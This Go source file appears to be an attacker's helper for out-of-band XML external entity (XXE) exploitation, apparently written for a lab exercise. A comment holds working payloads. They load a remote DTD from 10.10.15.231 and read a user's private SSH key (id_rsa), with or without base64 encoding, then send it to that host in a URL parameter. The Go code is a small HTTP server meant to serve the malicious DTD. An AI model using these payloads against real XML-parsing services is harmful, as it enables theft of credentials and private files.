package xxe

/*
POST examples for out of band testing

<?xml version = "1.0"?>
<!DOCTYPE convert [ <!ENTITY % remote SYSTEM
"http://10.10.15.231:8081/file.dtd">
%remote;%int;%trick;]>
<order>
  <quantity>1</quantity>
  <item>Home Appliances</item>
  <address>444</address>
</order>

file.dtd with encoding

<!ENTITY % payl SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=file:///c:/users/daniel/.ssh/id_rsa">                                         <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://10.10.15.231:8081/?p=%payl;'>">

file.dtd without encoding

<!ENTITY % payl SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://10.10.15.231:8081/?p=%payl;'>">
*/

import (
	"fmt"
	"log"
	"net/http"
)

func dtdHandler(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/file.dtd" {
		http.Error(w, "404 not found.", http.StatusNotFound)
		return
	}

	if r.Method != "GET" {
		http.Error(w, "Method is not supported.", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, "Hello!")
}

func serveDtd() {
	http.HandleFunc("/file.dtd", dtdHandler)

	fmt.Printf("Starting server at port 1337\n")
	if err := http.ListenAndServe(":1337", nil); err != nil {
		log.Fatal(err)
	}
}
